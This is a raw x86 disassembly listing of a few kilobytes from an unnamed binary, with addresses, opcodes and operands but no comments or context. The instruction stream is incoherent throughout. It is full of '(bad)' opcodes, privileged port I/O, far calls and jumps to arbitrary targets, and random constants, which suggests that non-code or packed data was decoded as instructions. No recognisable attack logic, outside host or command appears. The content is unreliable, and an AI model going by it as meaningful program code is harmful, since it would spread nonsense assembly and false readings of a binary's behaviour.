  40d1dd:	pop    ebp
  40d1de:	arpl   bp,sp
  40d1e0:	push   ebx
  40d1e1:	(bad)  
  40d1e2:	not    DWORD PTR [edx]
  40d1e4:	mov    ah,0x9c
  40d1e6:	hlt    
  40d1e7:	cmp    edx,0xf545d99f
  40d1ed:	sbb    ah,BYTE PTR [esi-0x6a]
  40d1f0:	push   0x938bbc9
  40d1f5:	aas    
  40d1f6:	push   ebx
  40d1f7:	mov    ebx,0x707bdb6
  40d1fc:	inc    ebp
  40d1fd:	inc    esi
  40d1fe:	mov    ebp,0x73105f3a
  40d203:	inc    ecx
  40d204:	adc    al,0xe9
  40d206:	jbe    0x40d1e8
  40d208:	cmp    al,0x67
  40d20a:	push   ecx
  40d20b:	push   edx
  40d20c:	bound  ecx,QWORD PTR [edi-0x6a]
  40d20f:	or     DWORD PTR [edx+0x626a93e2],ebp
  40d215:	sbb    BYTE PTR [edx+0x4acefd40],cl
  40d21b:	js     0x40d25d
  40d21d:	or     BYTE PTR [edi+0x53eed2ce],bl
  40d223:	out    0x68,al
  40d225:	pop    edx
  40d226:	lods   eax,DWORD PTR ds:[esi]
  40d227:	inc    ebp
  40d228:	mov    ds:0xef3957bc,eax
  40d22d:	xor    bh,dh
  40d22f:	jb     0x40d1cb
  40d231:	cmc    
  40d232:	or     eax,0x235c3406
  40d237:	pop    esp
  40d238:	mov    ebx,DWORD PTR [ebx-0x3c]
  40d23b:	mov    ss,WORD PTR [edx+eiz*1-0x12]
  40d23f:	test   BYTE PTR [ecx+0x4dcf8bf2],cl
  40d245:	out    dx,al
  40d246:	cmp    al,0xca
  40d248:	xchg   DWORD PTR [esi],ecx
  40d24a:	scas   al,BYTE PTR es:[edi]
  40d24b:	rol    cl,1
  40d24d:	imul   edx,DWORD PTR [ecx+0x58],0x1db66946
  40d254:	pop    ebx
  40d255:	mov    eax,ds:0x659359e6
  40d25a:	popf   
  40d25b:	cmp    ah,BYTE PTR [esi+0x2a]
  40d25e:	lahf   
  40d25f:	sti    
  40d260:	test   BYTE PTR [eax-0x1f9d135a],al
  40d266:	and    eax,0x7d1e5c0a
  40d26b:	pop    eax
  40d26c:	ror    BYTE PTR [eax+0x7334d014],cl
  40d272:	fild   WORD PTR [ebx+0x63]
  40d275:	sub    eax,0x90c407c3
  40d27a:	mov    ds:0xe8e41c1d,al
  40d27f:	cmp    dl,cl
  40d281:	stos   BYTE PTR es:[edi],al
  40d282:	xchg   ebp,eax
  40d283:	(bad)  
  40d284:	pop    edi
  40d285:	or     BYTE PTR [eax+ebp*4+0x43],bl
  40d289:	addr16 fwait
  40d28b:	rol    BYTE PTR [edi+0x5dfbabed],1
  40d291:	repnz push ss
  40d293:	sbb    dl,dh
  40d295:	ret    
  40d296:	and    al,0x99
  40d299:	add    eax,0x6560b519
  40d29e:	xor    edx,DWORD PTR [esi]
  40d2a0:	loopne 0x40d2ea
  40d2a2:	out    0x8d,al
  40d2a4:	xchg   ecx,eax
  40d2a5:	adc    BYTE PTR [edi-0x3e46cbdf],ch
  40d2ab:	and    DWORD PTR [eax],0xf8ba6cca
  40d2b1:	sbb    eax,0x847ceac0
  40d2b7:	ds mov edi,0x4ec1d6cc
  40d2bd:	outs   dx,BYTE PTR ds:[esi]
  40d2be:	pop    ecx
  40d2bf:	ret    0xea0a
  40d2c2:	pop    ecx
  40d2c3:	stos   DWORD PTR es:[edi],eax
  40d2c4:	test   ebp,esp
  40d2c6:	jno    0x40d259
  40d2c8:	or     ebx,DWORD PTR [esi]
  40d2ca:	or     eax,0xca155b76
  40d2cf:	call   0xee51dee4
  40d2d4:	icebp  
  40d2d5:	push   eax
  40d2d6:	lds    edi,FWORD PTR [ecx]
  40d2d8:	push   ss
  40d2d9:	push   ds
  40d2da:	ret    0x1137
  40d2dd:	cmp    ah,BYTE PTR [ebp-0xcad8f72]
  40d2e3:	in     eax,dx
  40d2e4:	xchg   esp,eax
  40d2e5:	sbb    eax,0xb78d40fa
  40d2ea:	xchg   edx,eax
  40d2eb:	pop    ecx
  40d2ec:	add    bh,bh
  40d2ee:	jg     0x40d32f
  40d2f0:	clc    
  40d2f1:	outs   dx,DWORD PTR ds:[esi]
  40d2f2:	cmp    eax,0xa3487a3a
  40d2f7:	sar    BYTE PTR [ecx+0x1bc51706],0xa
  40d2fe:	jp     0x40d308
  40d300:	stos   BYTE PTR es:[edi],al
  40d301:	clc    
  40d302:	push   esi
  40d303:	cdq    
  40d304:	pushf  
  40d305:	addr16 cmp al,0xe3
  40d308:	repz xchg ebp,eax
  40d30a:	or     BYTE PTR [ebx+edi*2+0x64dd394],cl
  40d311:	in     eax,dx
  40d312:	stc    
  40d313:	jmp    0xdce26719
  40d318:	mov    ebx,0xd94ef48a
  40d31d:	push   cs
  40d31e:	cwde   
  40d31f:	(bad)  [ebp-0x6b]
  40d322:	cmp    ecx,DWORD PTR [eax]
  40d324:	pop    ebx
  40d325:	aam    0x35
  40d327:	mov    dh,0xdc
  40d329:	push   0xffffffc0
  40d32b:	aaa    
  40d32c:	mov    esi,0x49733c34
  40d331:	or     eax,0x77b75082
  40d336:	xchg   ebp,eax
  40d337:	pop    ecx
  40d338:	inc    esi
  40d339:	add    al,0xbd
  40d33b:	retf   
  40d33c:	mov    edi,0x144c7bee
  40d341:	mov    edi,0xc068a976
  40d346:	(bad)  
  40d348:	lods   al,BYTE PTR ds:[esi]
  40d349:	ret    0x1364
  40d34c:	pop    edi
  40d34d:	lds    ebx,FWORD PTR [edi]
  40d34f:	and    DWORD PTR [edx-0x5588c0bf],esi
  40d355:	dec    ebx
  40d356:	mul    BYTE PTR [ebx+0x0]
  40d359:	xor    eax,ebx
  40d35b:	mov    bl,BYTE PTR [esi]
  40d35d:	xchg   edi,eax
  40d35e:	icebp  
  40d35f:	jp     0x40d3c2
  40d361:	popf   
  40d362:	aam    0xa7
  40d364:	and    BYTE PTR [ecx+edx*2],0x17
  40d368:	popa   
  40d369:	sar    bh,cl
  40d36b:	es stos DWORD PTR es:[edi],eax
  40d36d:	pop    ebp
  40d36e:	xchg   esi,eax
  40d36f:	dec    ecx
  40d370:	lock pop ebp
  40d372:	dec    edx
  40d373:	lods   eax,DWORD PTR ds:[esi]
  40d374:	fs sub al,ah
  40d377:	inc    eax
  40d378:	call   0xe3fc:0xfb5d2c59
  40d37f:	test   al,0x18
  40d381:	ror    dl,0x41
  40d384:	push   ecx
  40d385:	pop    edi
  40d386:	pop    ecx
  40d387:	ss push ebx
  40d389:	stc    
  40d38a:	test   al,0x20
  40d38c:	fld    DWORD PTR [edx-0x49]
  40d38f:	mov    ebx,0x92d4fa5b
  40d394:	sub    eax,DWORD PTR [ecx+0x459935d5]
  40d39a:	sbb    DWORD PTR [esi+0x41],ebx
  40d39d:	aas    
  40d39e:	inc    ebp
  40d39f:	mul    BYTE PTR [ebx]
  40d3a1:	pop    ecx
  40d3a2:	or     ecx,eax
  40d3a4:	push   ebx
  40d3a5:	xor    BYTE PTR [ecx],0x9
  40d3a8:	and    eax,0xf4f5449d
  40d3ad:	loope  0x40d407
  40d3af:	jge    0x40d351
  40d3b1:	pop    esi
  40d3b2:	cmc    
  40d3b3:	push   ebx
  40d3b4:	sub    DWORD PTR [bx-0x7d],eax
  40d3b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3b9:	pop    esp
  40d3ba:	(bad)  
  40d3bb:	pop    ds
  40d3bc:	mov    bh,0xa4
  40d3be:	xchg   edi,eax
  40d3bf:	mov    cl,0x76
  40d3c1:	xchg   DWORD PTR [esi+0x2107b7de],edi
  40d3c7:	(bad)  
  40d3c8:	sbb    al,al
  40d3ca:	std    
  40d3cb:	mov    ebx,0xaadef9e1
  40d3d0:	out    0xd0,al
  40d3d2:	adc    al,0x4a
  40d3d4:	xor    edx,DWORD PTR [eax+ebp*8]
  40d3d7:	push   ds
  40d3d8:	inc    edi
  40d3d9:	sub    bl,BYTE PTR [eax+0x230d50c9]
  40d3df:	out    0xeb,eax
  40d3e1:	sub    edi,eax
  40d3e3:	mov    ecx,0xc7609fb5
  40d3e8:	or     BYTE PTR [esi-0x80],ch
  40d3eb:	adc    esi,DWORD PTR [eax+0x28]
  40d3ee:	cwde   
  40d3ef:	push   ebp
  40d3f0:	pop    ebp
  40d3f1:	push   ds
  40d3f2:	dec    ebx
  40d3f3:	outs   dx,BYTE PTR ds:[esi]
  40d3f4:	rcr    cl,cl
  40d3f6:	pop    ebx
  40d3f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3f8:	sbb    DWORD PTR [ebp+0x68ae4089],ecx
  40d3fe:	out    0x5,eax
  40d400:	imul   esp,DWORD PTR [eax+0x75],0xa85f1a52
  40d407:	adc    ch,bh
  40d409:	repz imul ebp,DWORD PTR [ebx-0x1fc94e84],0x5bf3b199
  40d414:	mov    ch,0x4a
  40d416:	adc    al,0xde
  40d418:	dec    edi
  40d419:	xor    al,0x12
  40d41b:	jne    0x40d3c6
  40d41d:	inc    ebx
  40d41e:	aad    0x34
  40d420:	sub    edx,DWORD PTR [edx]
  40d422:	mov    ebx,0xe51bc25b
  40d427:	push   0xbc900970
  40d42c:	out    0x61,eax
  40d42e:	dec    ecx
  40d42f:	int3   
  40d430:	lea    edi,[edi+0x28]
  40d433:	shr    BYTE PTR [edi+0x2c],cl
  40d436:	and    BYTE PTR [edi-0x76],cl
  40d439:	ret    
  40d43a:	xchg   ecx,eax
  40d43b:	inc    edx
  40d43c:	push   0xfe2de57c
  40d441:	cld    
  40d442:	rcl    DWORD PTR [esp+ebp*8],1
  40d445:	push   ebp
  40d446:	int    0xf2
  40d448:	shr    DWORD PTR ds:0x194de5b9,cl
  40d44e:	enter  0x5d7e,0xce
  40d452:	or     edx,DWORD PTR [ecx+0x4a42fbec]
  40d458:	lods   eax,DWORD PTR ds:[esi]
  40d459:	(bad)
  40d45c:	jno    0x40d45d
  40d45e:	inc    edx
  40d45f:	jne    0x40d499
  40d461:	rcr    BYTE PTR [ebp-0x3cfe5800],cl
  40d467:	dec    esp
  40d468:	sahf   
  40d469:	fstp   TBYTE PTR [ebx]
  40d46b:	push   ebp
  40d46c:	pop    esi
  40d46d:	scas   eax,DWORD PTR es:[edi]
  40d46e:	inc    eax
  40d46f:	fsubr  DWORD PTR [ebx-0x76]
  40d472:	das    
  40d473:	sbb    eax,0x30752f4a
  40d478:	fld    DWORD PTR [edx-0x7c8ce299]
  40d47e:	push   es
  40d47f:	jmp    0x731344c8
  40d484:	lea    ebp,[eax-0x78155c85]
  40d48a:	cs jae 0x40d422
  40d48d:	or     ebx,ebx
  40d48f:	out    0xa5,eax
  40d491:	mov    cl,0x8b
  40d493:	sub    al,0x9b
  40d495:	out    0x93,eax
  40d497:	mov    eax,DWORD PTR [ebx-0x25]
  40d49a:	outs   dx,BYTE PTR ds:[esi]
  40d49b:	mov    esi,0x1a5928ae
  40d4a0:	leave  
  40d4a1:	sbb    edi,esi
  40d4a3:	pop    ebp
  40d4a4:	xchg   BYTE PTR [ebx+0x49f23ecb],dh
  40d4aa:	sbb    BYTE PTR [edx-0x72a16a29],al
  40d4b0:	sub    ecx,ebx
  40d4b2:	or     BYTE PTR [esi],bh
  40d4b4:	adc    eax,0xf827f75d
  40d4b9:	int    0x7d
  40d4bb:	ret    
  40d4bc:	pop    esi
  40d4bd:	fstp   TBYTE PTR [ebx-0x4b63d374]
  40d4c3:	mov    ds:0xf7770ba1,al
  40d4c8:	clc    
  40d4c9:	int3   
  40d4ca:	push   edi
  40d4cb:	xor    bl,BYTE PTR [ebp+0x25]
  40d4ce:	adc    DWORD PTR [edi-0x3d],eax
  40d4d1:	loope  0x40d4f2
  40d4d3:	xchg   BYTE PTR [ebx-0x12],ch
  40d4d6:	dec    ecx
  40d4d8:	push   ebp
  40d4d9:	xor    BYTE PTR [edx+0x54],dh
  40d4dc:	pop    es
  40d4dd:	sub    al,BYTE PTR [edi+ecx*1+0x66]
  40d4e1:	inc    edx
  40d4e2:	sub    ah,BYTE PTR [ecx+ebx*8-0xc]
  40d4e6:	scas   eax,DWORD PTR es:[edi]
  40d4e7:	mov    ds:0xc4dbd4b2,al
  40d4ec:	aad    0xee
  40d4ee:	jbe    0x40d48e
  40d4f0:	int    0x71
  40d4f2:	adc    eax,0xdaa13172
  40d4f7:	push   0xa7ffa5d6
  40d4fc:	xor    bl,cl
  40d4fe:	and    DWORD PTR [ecx+ebp*2],0x27f247b0
  40d505:	mov    bh,0xf
  40d507:	(bad)  
  40d508:	out    0xfd,eax
  40d50a:	sti    
  40d50b:	mov    bl,0x9b
  40d50d:	xchg   esp,eax
  40d50e:	inc    ebp
  40d50f:	dec    esp
  40d510:	(bad)  
  40d511:	popf   
  40d512:	fwait
  40d513:	mov    BYTE PTR [edi],0xdd
  40d516:	adc    eax,DWORD PTR [ecx+0x518ddc43]
  40d51c:	jl     0x40d573
  40d51e:	mov    ebp,0x5ca13a6f
  40d523:	pop    es
  40d524:	mov    al,ds:0x5c4ce872
  40d529:	xchg   edx,eax
  40d52a:	cmc    
  40d52b:	call   0xac09:0x1df74af
  40d532:	inc    edx
  40d533:	pop    ebp
  40d534:	jb     0x40d555
  40d536:	into   
  40d537:	mov    eax,0xa66e55d7
  40d53c:	sub    eax,0xa4388042
  40d541:	outs   dx,DWORD PTR ds:[esi]
  40d542:	sub    edi,DWORD PTR [edx-0x525f8160]
  40d548:	ja     0x40d59a
  40d54a:	in     eax,0x9f
  40d54c:	lds    edx,FWORD PTR [esi+0x19]
  40d54f:	and    ch,dh
  40d551:	dec    esp
  40d552:	sub    eax,0x60040bdd
  40d557:	ja     0x40d529
  40d559:	test   eax,0x91b9ae30
  40d55e:	inc    esp
  40d55f:	ds push ebx
  40d561:	pop    ds
  40d562:	out    0x37,al
  40d564:	mov    ds:0xdb3eab00,eax
  40d569:	or     eax,0xcecf1450
  40d56e:	mov    dh,0x95
  40d570:	inc    eax
  40d571:	aas    
  40d572:	inc    esi
  40d573:	jg     0x40d557
  40d575:	(bad)  
  40d576:	je     0x40d50a
  40d578:	das    
  40d579:	push   ds
  40d57a:	ja     0x40d577
  40d57c:	popf   
  40d57d:	or     eax,0x36afa4a0
  40d582:	mov    bl,0x2e
  40d584:	push   esp
  40d585:	pop    ebx
  40d586:	out    dx,eax
  40d587:	pop    edx
  40d588:	push   esp
  40d589:	push   eax
  40d58a:	xor    eax,0x12d8e41b
  40d58f:	pop    esi
  40d590:	sub    al,0x8e
  40d592:	mov    ds:0x7f8ef193,al
  40d597:	out    0x26,eax
  40d599:	and    eax,0x7e790c55
  40d59e:	cdq    
  40d59f:	mov    BYTE PTR [esi+0x2fa88c22],cl
  40d5a5:	jns    0x40d5c5
  40d5a7:	test   DWORD PTR [eax-0x2497ac7f],esi
  40d5ad:	and    al,0x7d
  40d5af:	mov    edi,DWORD PTR [edi-0x42ee00ce]
  40d5b5:	sahf   
  40d5b6:	or     DWORD PTR [bx-0x35],0x30
  40d5bb:	mov    WORD PTR [eax+0x6a],es
  40d5be:	repnz fs and eax,0xd6992396
  40d5c5:	dec    BYTE PTR [eax]
  40d5c7:	into   
  40d5c8:	iret   
  40d5c9:	aad    0xc3
  40d5cb:	sub    BYTE PTR [esi+0x4b65a95b],al
  40d5d1:	dec    eax
  40d5d2:	sub    DWORD PTR [ecx-0x4],esp
  40d5d5:	sbb    eax,DWORD PTR [ecx+ebp*2-0x3b]
  40d5d9:	lods   eax,DWORD PTR ds:[esi]
  40d5da:	int    0xd4
  40d5dc:	call   0x5850:0x3a67a3b5
  40d5e3:	adc    BYTE PTR [edi],0x53
  40d5e6:	mov    edi,0xd43858a6
  40d5eb:	mov    WORD PTR [ebx],cs
  40d5ed:	adc    edx,DWORD PTR [ecx-0x6]
  40d5f0:	dec    ebx
  40d5f1:	stos   DWORD PTR es:[edi],eax
  40d5f2:	push   ebp
  40d5f3:	mov    eax,DWORD PTR [esp+ebx*2-0x1c]
  40d5f7:	and    eax,0xe3eeb885
  40d5fc:	rcr    DWORD PTR [edx+0x7f],cl
  40d5ff:	add    eax,0xe70e039d
  40d604:	in     al,dx
  40d605:	dec    eax
  40d606:	cmp    dl,bh
  40d608:	jae    0x40d628
  40d60a:	shr    DWORD PTR [esi+0x44],1
  40d60d:	popf   
  40d60e:	call   0xbcdcfcf0
  40d613:	addr16 aad 0x14
  40d616:	ins    DWORD PTR es:[edi],dx
  40d617:	pop    esp
  40d618:	jl     0x40d5fa
  40d61a:	lods   eax,DWORD PTR ds:[esi]
  40d61b:	xor    bh,BYTE PTR [ecx+0x6b]
  40d61e:	and    eax,edi
  40d620:	mul    BYTE PTR [eax+0x45]
  40d623:	cmp    ebp,DWORD PTR [esi]
  40d625:	ins    BYTE PTR es:[edi],dx
  40d626:	pop    esp
  40d627:	loope  0x40d657
  40d629:	push   ds
  40d62a:	push   esp
  40d62b:	mov    esp,0xdf0f2685
  40d630:	(bad)  
  40d631:	sub    DWORD PTR [ebx-0x41],eax
  40d634:	neg    DWORD PTR [edi+0x35591eed]
  40d63a:	jmp    0x9efafbc5
  40d63f:	sbb    eax,0x3c9d2564
  40d644:	(bad)  
  40d645:	fisubr WORD PTR [esi-0x1d]
  40d648:	(bad)  
  40d64a:	inc    edx
  40d64b:	call   0x53b1da84
  40d650:	adc    BYTE PTR ds:0x61d16e62,dl
  40d656:	dec    ebp
  40d657:	es inc ecx
  40d659:	rcl    BYTE PTR [esi+0x10],cl
  40d65c:	add    BYTE PTR [ecx],ah
  40d65e:	idiv   BYTE PTR [edi*8-0x4b84d7f4]
  40d665:	push   es
  40d666:	jae    0x40d669
  40d668:	call   0x1002:0x32699b51
  40d66f:	jmp    0x7fe76485
  40d674:	cmp    DWORD PTR [esi-0x40],ebp
  40d677:	fnsave [edx+0x1b545969]
  40d67d:	ret    
  40d67e:	(bad)  
  40d67f:	cmp    eax,0x2bee8ff0
  40d684:	iret   
  40d685:	cwde   
  40d686:	ins    DWORD PTR es:[edi],dx
  40d687:	mov    ah,0xeb
  40d689:	sub    edx,DWORD PTR [ebx-0x61]
  40d68c:	mov    eax,0x4d968a79
  40d691:	pop    es
  40d692:	xor    eax,0xd9c82856
  40d697:	or     eax,0x37bc62eb
  40d69c:	pushf  
  40d69d:	pop    esp
  40d69e:	cmp    eax,0xbd10901a
  40d6a3:	retf   
  40d6a4:	xor    BYTE PTR [ebp-0x18],ah
  40d6a7:	int3   
  40d6a8:	xchg   ecx,eax
  40d6a9:	fiadd  WORD PTR [ecx-0x1f]
  40d6ac:	jl     0x40d6fa
  40d6ae:	test   eax,0x58767a82
  40d6b3:	mov    al,0x77
  40d6b5:	mov    bh,0xf4
  40d6b7:	mov    bh,0x60
  40d6b9:	in     eax,dx
  40d6ba:	add    edx,DWORD PTR ds:0x9d84d548
  40d6c0:	dec    edx
  40d6c1:	js     0x40d697
  40d6c3:	fsubr  QWORD PTR [edi+0x31]
  40d6c6:	xchg   DWORD PTR ds:0x36771eb9,esp
  40d6cc:	stos   BYTE PTR es:[edi],al
  40d6cd:	daa    
  40d6ce:	xlat   BYTE PTR ds:[ebx]
  40d6cf:	jl     0x40d6ca
  40d6d1:	(bad)  
  40d6d2:	hlt    
  40d6d3:	sbb    BYTE PTR [ecx-0x6a290729],al
  40d6d9:	pop    DWORD PTR [ebp+0x40553be0]
  40d6df:	sbb    al,0x98
  40d6e1:	mov    ch,0xf5
  40d6e3:	and    DWORD PTR [ecx+0x582252be],esp
  40d6e9:	and    esi,DWORD PTR [ecx-0x2ed80141]
  40d6ef:	mov    DWORD PTR [eax+0x2b],edx
  40d6f2:	sbb    al,0x60
  40d6f4:	aad    0x14
  40d6f6:	sbb    al,0xb9
  40d6f8:	inc    BYTE PTR [eax-0x5e]
  40d6fb:	mov    ebx,0xbbe525c1
  40d700:	pop    esi
  40d701:	xchg   esi,eax
  40d702:	clc    
  40d703:	sub    al,0x78
  40d705:	out    dx,al
  40d706:	xor    ecx,DWORD PTR [bp+di+0x44]
  40d70a:	call   0xd77a:0xe8e6fc78
  40d711:	push   eax
  40d712:	fiadd  WORD PTR [esp+edi*8]
  40d715:	dec    ebx
  40d716:	inc    ecx
  40d717:	gs jmp 0x9f53ea33
  40d71d:	push   edx
  40d71e:	xor    ah,BYTE PTR [ebx-0x5e71c573]
  40d724:	jmp    0x314b:0x6ff2b680
  40d72b:	mov    dh,0xf1
  40d72e:	jno    0x40d731
  40d730:	xchg   esp,eax
  40d731:	add    BYTE PTR [esi-0x6b731c6a],al
  40d737:	out    dx,eax
  40d738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d739:	xor    edx,ecx
  40d73b:	pop    ecx
  40d73c:	lds    ecx,FWORD PTR [eax+esi*1-0x458f0e20]
  40d743:	(bad)  
  40d744:	lahf   
  40d745:	dec    esp
  40d746:	(bad)  
  40d747:	cdq    
  40d748:	cmp    dh,BYTE PTR [ecx]
  40d74a:	out    0x6a,eax
  40d74c:	sub    eax,esp
  40d74e:	sub    edx,DWORD PTR [edi]
  40d750:	repz mov bh,dh
  40d753:	sbb    al,0xa4
  40d755:	lahf   
  40d756:	or     edx,eax
  40d758:	push   edi
  40d759:	and    DWORD PTR [edx],eax
  40d75b:	or     bh,BYTE PTR [edx]
  40d75d:	lods   eax,DWORD PTR ds:[esi]
  40d75e:	sbb    al,0xd2
  40d761:	shl    BYTE PTR [esi],cl
  40d763:	std    
  40d764:	xchg   ebx,eax
  40d765:	shr    BYTE PTR [ebx],1
  40d767:	xor    BYTE PTR [ebx+0x5b3a8e0a],bh
  40d76d:	mov    ds:0x9d919aea,al
  40d772:	pop    edi
  40d773:	xabort 0x7f
  40d776:	neg    BYTE PTR [ebx+0x277e8620]
  40d77c:	mov    edx,0x7d82f656
  40d781:	lahf   
  40d782:	jp     0x40d7d2
  40d784:	ins    DWORD PTR es:[edi],dx
  40d785:	sbb    eax,0xb2eef0e
  40d78a:	loope  0x40d750
  40d78c:	pop    ebx
  40d78d:	adc    dl,0x9b
  40d790:	retf   0x3304
  40d793:	(bad)
  40d796:	jp     0x40d801
  40d798:	std    
  40d799:	outs   dx,BYTE PTR ds:[esi]
  40d79a:	sbb    al,0x96
  40d79c:	sbb    eax,ebx
  40d79e:	dec    ebx
  40d79f:	mov    dh,0x58
  40d7a1:	xlat   BYTE PTR ds:[ebx]
  40d7a2:	mov    cl,0x34
  40d7a4:	and    al,0x79
  40d7a6:	nop
  40d7a7:	push   es
  40d7a8:	adc    ecx,DWORD PTR [bp+si+0x3451]
  40d7ad:	ja     0x40d74e
  40d7af:	xor    DWORD PTR [edi+ebx*4+0x37],0xffffffde
  40d7b4:	mov    dh,0x8d
  40d7b6:	inc    edx
  40d7b7:	cmc    
  40d7b8:	fs out 0x99,al
  40d7bb:	sub    DWORD PTR [ebx+0x46],esi
  40d7be:	fimul  DWORD PTR [ebx*1-0x665e58df]
  40d7c5:	mov    ebp,0x887bc356
  40d7ca:	xchg   edx,eax
  40d7cb:	test   DWORD PTR [edx+0x58],ecx
  40d7ce:	inc    esp
  40d7cf:	lock sbb esi,DWORD PTR [ecx]
  40d7d2:	mov    bh,0x26
  40d7d4:	sbb    eax,0x980acf72
  40d7d9:	(bad)  
  40d7da:	mov    eax,0xd92a6a06
  40d7df:	jmp    ebp
  40d7e1:	rol    DWORD PTR [ebx+0x480ac100],cl
  40d7e7:	out    dx,eax
  40d7e8:	mov    eax,0x45b1b940
  40d7ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7ee:	xor    DWORD PTR [edx],0x27
  40d7f1:	and    DWORD PTR [ebp-0x5c41a9f9],0xfffffffc
  40d7f8:	call   0xed9ae8d4
  40d7fd:	sub    esp,esp
  40d7ff:	sub    eax,0x9df3790e
  40d804:	bound  edi,QWORD PTR [edi+0x4f]
  40d807:	ins    DWORD PTR es:[edi],dx
  40d808:	inc    eax
  40d809:	fwait
  40d80a:	retf   
  40d80b:	xchg   ebx,eax
  40d80c:	mov    DWORD PTR [ecx+0x6a],ebx
  40d80f:	pop    ss
  40d810:	mov    ebp,DWORD PTR [esi]
  40d812:	sub    cl,BYTE PTR [ebx+0xa]
  40d815:	test   BYTE PTR [edx-0x1a96ef9a],ch
  40d81b:	adc    ebx,DWORD PTR [ecx+0x45]
  40d81e:	sbb    DWORD PTR [esi+ebx*2],edi
  40d821:	cdq    
  40d822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d823:	lahf   
  40d824:	xor    BYTE PTR [ecx+0x11],cl
  40d827:	cmp    bh,bh
  40d829:	fisubr DWORD PTR [edx+ebp*4]
  40d82c:	fmulp  st(7),st
  40d82e:	ret    
  40d82f:	fcomip st,st(1)
  40d831:	xor    DWORD PTR [esi+0x69],edx
  40d834:	popa   
  40d835:	mov    ah,0xdc
  40d837:	mov    al,0x77
  40d839:	(bad)  
  40d83a:	in     eax,0xee
  40d83c:	adc    DWORD PTR [ebx],eax
  40d83e:	imul   eax,DWORD PTR [esi+0x45070b81],0xffffffea
  40d845:	push   es
  40d846:	xor    esi,DWORD PTR [ecx-0x56544f03]
  40d84c:	arpl   WORD PTR [ebp+edx*8-0x1d],cx
  40d850:	das    
  40d851:	cdq    
  40d852:	jmp    0x40d880
  40d854:	sti    
  40d855:	jns    0x40d80e
  40d857:	inc    edx
  40d858:	inc    edi
  40d859:	gs pop ebp
  40d85b:	je     0x40d88f
  40d85d:	jecxz  0x40d82c
  40d85f:	push   es
  40d860:	jge    0x40d88f
  40d862:	retf   0x133e
  40d865:	das    
  40d866:	mov    esp,0x3dffa5a6
  40d86b:	std    
  40d86c:	mul    DWORD PTR [ebx-0x66]
  40d86f:	inc    esp
  40d870:	sbb    ecx,ecx
  40d872:	cmp    ch,al
  40d874:	(bad)  
  40d875:	iret   
  40d876:	retf   0x37d4
  40d879:	mov    esi,0x6b90bfa3
  40d87e:	push   ss
  40d87f:	adc    DWORD PTR [esi-0x796a3449],0xffffffc2
  40d886:	lods   eax,DWORD PTR ds:[esi]
  40d887:	sar    BYTE PTR [eax-0x322b7da6],0x7c
  40d88e:	popf   
  40d88f:	stos   DWORD PTR es:[edi],eax
  40d890:	ret    0x9794
  40d893:	loope  0x40d8e8
  40d895:	loop   0x40d8da
  40d897:	retf   
  40d898:	sub    eax,0xaaa13b38
  40d89d:	add    ecx,DWORD PTR [esi]
  40d89f:	ret    
  40d8a0:	std    
  40d8a1:	jge    0x40d85f
  40d8a3:	add    al,0xc1
  40d8a5:	push   esi
  40d8a6:	repz mov ah,0xdd
  40d8a9:	mov    cl,0x37
  40d8ab:	and    BYTE PTR [esi+0x29],bl
  40d8ae:	scas   al,BYTE PTR es:[edi]
  40d8af:	xor    bh,BYTE PTR [eax-0x3dacfad4]
  40d8b5:	rol    eax,0x87
  40d8b8:	(bad)  
  40d8b9:	in     eax,0x88
  40d8bb:	lock fisubr DWORD PTR [ebx+eiz*8+0x6e4c35ba]
  40d8c3:	mov    esi,0xc526e17f
  40d8c8:	jb     0x40d893
  40d8ca:	sub    al,0x58
  40d8cc:	push   0x4c
  40d8ce:	jmp    0x13e6:0xff117985
  40d8d5:	dec    edx
  40d8d6:	sub    ebp,edx
  40d8d8:	cmc    
  40d8d9:	call   0x928bf82
  40d8de:	inc    edi
  40d8df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8e0:	jne    0x40d8a3
  40d8e2:	pop    edi
  40d8e3:	(bad)  
  40d8e4:	je     0x40d915
  40d8e6:	loop   0x40d8a7
  40d8e8:	or     eax,0x6b5aea8d
  40d8ee:	adc    ah,al
  40d8f0:	xor    BYTE PTR [esi+0x273ba556],bl
  40d8f6:	pop    ss
  40d8f7:	(bad)  
  40d8f8:	out    0xc,al
  40d8fa:	ins    DWORD PTR es:[edi],dx
  40d8fb:	mov    ds:0x3e11128e,al
  40d900:	inc    ebp
  40d901:	mov    al,ds:0x1430cf58
  40d906:	das    
  40d907:	in     eax,0x0
  40d909:	jmp    0xd33df6a5
  40d90e:	das    
  40d90f:	fldl2e 
  40d911:	cmp    eax,0xe1902d7c
  40d916:	and    BYTE PTR [ecx],cl
  40d918:	enter  0x7722,0x73
  40d91c:	and    dl,BYTE PTR [edi]
  40d91e:	sahf   
  40d91f:	mov    al,0x83
  40d921:	mov    esi,0xbd00a9b4
  40d926:	pop    ebp
  40d927:	mov    esp,0xe2b9aaae
  40d92c:	loope  0x40d95f
  40d92e:	sbb    dl,dh
  40d930:	leave  
  40d931:	mov    ah,0x2a
  40d933:	in     al,dx
  40d934:	cmp    eax,0x457fbf98
  40d939:	fwait
  40d93a:	nop
  40d93b:	gs jmp 0xf23e938c
  40d941:	xchg   ecx,eax
  40d942:	clc    
  40d943:	mov    bh,0xb3
  40d945:	inc    esp
  40d946:	mov    ds:0xeb6bd29,al
  40d94b:	pop    eax
  40d94c:	test   DWORD PTR [eax-0x188695cb],edi
  40d952:	es adc al,0xc5
  40d955:	mov    BYTE PTR ds:0x77d330b9,ah
  40d95b:	das    
  40d95c:	mov    ah,0xe2
  40d95e:	push   ecx
  40d95f:	dec    ebx
  40d960:	jmp    0x40d991
  40d962:	fbstp  TBYTE PTR ds:0xa5c8b082
  40d968:	mov    ch,0x3c
  40d96a:	adc    edi,edx
  40d96c:	mov    ds:0x4cf155e8,al
  40d971:	repz sub bh,bl
  40d974:	xor    al,0xb
  40d976:	push   cs
  40d977:	or     bh,ah
  40d979:	mov    al,0xa1
  40d97b:	dec    edx
  40d97c:	ret    
  40d97d:	push   edx
  40d97e:	xchg   edx,eax
  40d97f:	xchg   esp,eax
  40d980:	in     eax,0xe
  40d982:	sub    DWORD PTR [edi-0x22ee4ec0],0x33
  40d989:	pop    esi
  40d98a:	fld    TBYTE PTR [edx+edx*2+0x7a432919]
  40d991:	(bad)
